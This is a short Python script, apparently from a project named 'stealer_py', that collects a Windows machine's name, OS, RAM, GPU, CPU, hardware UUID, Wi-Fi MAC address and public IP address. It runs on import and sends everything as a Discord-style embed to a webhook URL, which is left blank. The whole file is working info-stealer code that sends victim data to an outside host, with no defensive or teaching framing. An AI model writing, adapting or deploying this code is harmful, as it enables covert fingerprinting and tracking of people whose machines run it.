import requests, wmi, subprocess, psutil, platform, json
hook = ""

def get_mac_address():
    for interface, addrs in psutil.net_if_addrs().items():
        if interface == "Wi-Fi":
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    mac = addr.address
                    return mac
def machineinfo():
    mem = psutil.virtual_memory()
    c = wmi.WMI()
    for gpu in c.Win32_DisplayConfiguration(): 
        GPUm = gpu.Description.strip()
    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
    reqip = requests.get("https://api.ipify.org/?format=json").json()      
    mac = get_mac_address()
    payload = {"embeds": [{"title": "Machine Info","username": "github.com/bylue","avatar_url": "https://cdn.discordapp.com/avatars/1052293216445136966/ebb00ca7e0ebe42e389f57156ed1d5e7.webp?size=80","description": "Github.com/bylue/stealer_py","fields": [{"name": ":computer: PC","value": f"`{platform.node()}`","inline": True},{"name": ":desktop: OS:","value": f"`{platform.platform()}`","inline": True},{"name": ":wrench: RAM","value": f"`{mem.total / 1024**3} GB`","inline": True},{"name": ":pager: GPU","value": f"`{GPUm}`","inline": True},{"name": ":zap: CPU","value": f"`{platform.processor()}`","inline": True},{"name": ":key: HWID","value": f"`{current_machine_id}`","inline": True},{"name": ":label: MAC","value": f"`{mac}`","inline": True},{"name": ":crossed_swords: IP","value": f"`{reqip['ip']}`","inline": True}]}]}
    headers = {"Content-Type": "Application/Json"}
    r = requests.post(hook, data=json.dumps(payload), headers=headers)
machineinfo()